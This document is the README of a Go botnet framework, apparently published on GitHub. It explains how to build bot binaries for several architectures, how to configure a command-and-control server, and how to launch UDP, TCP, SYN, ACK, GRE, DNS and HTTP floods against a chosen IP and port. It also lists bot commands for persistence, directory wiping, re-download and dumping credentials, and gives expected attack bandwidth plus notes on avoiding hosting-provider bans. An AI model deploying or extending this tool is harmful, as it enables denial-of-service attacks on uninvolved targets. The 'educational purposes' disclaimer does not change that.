# BotnetGo
Did a Little 2026 update just to clean it up [Thanks for the stars]

Go-based CnC + bot for network stress testing across multiple architectures.

[Demo video](https://www.youtube.com/watch?v=Xkm5yxWoNL8)

V5 [Main Release](https://github.com/1Birdo/GoFlood) is now out — combines Gostress-V2 + BotnetGo into one C2 framework with a REST API, web UI, terminal, encryption, and bi-directional proxy.

> 2024-09-20 — Last standalone botnet source release before moving to GoFlood.

![image1](https://github.com/user-attachments/assets/812f9717-c037-4399-ba57-e9bf4f610326)

## What it does

- Auth system with tiered accounts (Owner/Admin/Pro/Basic) and expiry dates
- Manages bot connections over TCP, tracks online count
- Dispatches flood commands to all connected bots
- Supports UDP, TCP, SYN, ACK, GRE, DNS, and HTTP methods
- Bot side has persistence, directory cleanup, and file locking
- C alternative included under `device_Alternative/`

## Requirements

- Go 1.18+
- Linux for the bot binaries (cross-compiled via build.sh)
- Ports below 1024 need root

## Setup

**CnC server:**
```bash
cd cnc
go mod init cnc
go mod tidy
go build -o cnc *.go
./cnc
```

If you're binding to a low port, use `sudo`. I'd recommend running it under `screen` so it doesn't die when you close your terminal:
```bash
sudo apt install screen
screen ./cnc
```

**Bot binaries:**
```bash
cd device
sh build.sh
```

That builds for x86, armv5, armv7, arm64, mips, and mipsel. If you just want a single binary:
```bash
go build -o bot bot.go
```

## Configuration

In `cnc/main.go`, edit the constants at the top:
- `cncBindAddr` / `nodeBindAddr` — listener IPs
- `cncPort` / `nodePort` — listener ports
- `killEnabled` in `device/bot.go` — set to `true` to run directory cleanup on startup instead of on command

In `device/bot.go`, set `serverAddr` to your CnC IP and port.

![image](https://github.com/user-attachments/assets/d5886f8c-1ac4-485d-b88c-b63a0acd51ff)

## Commands

Connect via telnet/putty/termius to the CnC port. The initial prompt expects `loginforme` before showing the login screen. Credentials are in `users.json` (auto-generated on first run with a random root password).

**Flood commands:**
```
!tcpflood <ip> <port> <seconds>
!udpflood <ip> <port> <seconds>
!udpsmart <ip> <port> <seconds>
!synflood <ip> <port> <seconds>
!ackflood <ip> <port> <seconds>
!greflood <ip> <port> <seconds>
!dns <ip> <port> <seconds>
!http <ip> <port> <seconds>
```

**Other:**
```
!kill       — clean directories on bots
!lock       — lock directories with chattr
!persist    — install systemd persistence on bots
!reinstall  — re-download and restart bot binary
bots        — show connected bot count
db          — dump user credentials
clear       — clear screen
logout      — disconnect
```

## Performance notes

With 10–16 VPS nodes (1 core, 1GB RAM, 1Gbps each), expect roughly 30–40 Gbps on UDP methods. TCP methods typically land around 20–28 Gbps. Actual throughput depends on packet size, server output, and RTT to the target.

Budget VPS hosts work fine for testing. Be aware that providers like OVH, Vultr, or Linode will suspend you for flooding.

## Disclaimer

**This project is for educational purposes only.** Make sure you have authorization before testing against any target. I'm not responsible for misuse.

DDoS attacks are a serious crime. Operations like PowerOFF and Endgame have shown that law enforcement actively pursues people running or using these tools maliciously.

## License

MIT — see [LICENSE](LICENSE).
